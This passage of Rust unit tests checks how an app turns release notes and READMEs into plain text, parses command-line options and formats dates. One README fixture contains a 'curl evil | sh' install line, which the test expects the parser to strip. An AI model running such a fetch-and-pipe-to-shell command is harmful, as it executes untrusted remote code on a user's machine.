        let notes = "<!-- generated -->\r\n# What's Changed\r\n\r\n\r\n* Fix crash by [@someone](https://github.com/someone) in [#12](https://github.com/a/b/pull/12)\r\n  - nested __point__\r\n\r\n![screenshot](https://example.com/x.png)\r\n\r\n---\r\n<details><summary>More</summary>\r\n\r\nSee <https://example.com/changelog> if a < b.\r\n</details>\r\n**Full Changelog**: https://github.com/a/b/compare/v1...v2";
        assert_eq!(
            plain_notes(notes),
            "What's Changed\n\n•  Fix crash by @someone in #12\n  •  nested point\n\nMore\n\nSee https://example.com/changelog if a < b.\n\nFull Changelog: https://github.com/a/b/compare/v1...v2"
        );
        assert_eq!(plain_notes(""), "");
        assert_eq!(plain_notes("[unclosed link and <odd"), "[unclosed link and <odd");
        assert_eq!(plain_notes("snake_case_name and 2 * 3"), "snake_case_name and 2 * 3");
        // Very long notes are cut, not dumped.
        let long = "word ".repeat(5000);
        assert!(plain_notes(&long).chars().count() < 30_000);
        assert!(plain_notes(&"line\n".repeat(5000)).ends_with('…'));
    }

    #[test]
    fn options_parse() {
        let args = ["--demo", "--ui", "tv", "--size", "1920x1080", "--as", "android-tv", "--page", "library"];
        let o = Options::from_args(args.map(String::from).into_iter()).unwrap();
        assert!(o.demo);
        assert_eq!(o.shell, Some(Shell::Tv));
        assert_eq!(o.size, Some((1920, 1080)));
        assert_eq!(o.page, Some(2));
        assert!(Options::from_args(["--ui", "watch"].map(String::from).into_iter()).is_err());
        assert!(Options::from_args(["--theme", "pink"].map(String::from).into_iter()).is_err());
        assert!(Options::from_args(["--page", "nowhere"].map(String::from).into_iter()).is_err());
    }

    #[test]
    fn dates_and_tints_are_stable() {
        assert_eq!(unix_date(1_700_000_000), "2023-11-14");
        assert_eq!(tint_for("github:a/b"), tint_for("github:a/b"));
    }

    #[test]
    fn a_readme_becomes_a_short_plain_description() {
        let readme = "<p align=\"center\"><img src=\"logo.png\"></p>\n\n# Thing\n\n[![build](b.svg)](ci)\n\nThing does **one** job well.\n\n## Install\n\n```sh\ncurl evil | sh\n```\n\n| a | b |\n|---|---|\n\n- Fast\n- See the [docs](https://x.invalid)\n";
        let about = plain_about(readme);
        assert_eq!(about, "Thing does one job well.\n\nInstall\n\n•  Fast\n•  See the docs");
        let long = format!("# T\n\n{}", "A sentence of filler text here.\n\n".repeat(80));
        let cut = plain_about(&long);
        assert!(
            cut.chars().count() <= 902 && cut.ends_with("here.\n…"),
            "cut at a line end: {:?}",
            &cut[cut.len() - 20..]
        );
        assert_eq!(plain_about(""), "");
    }
}
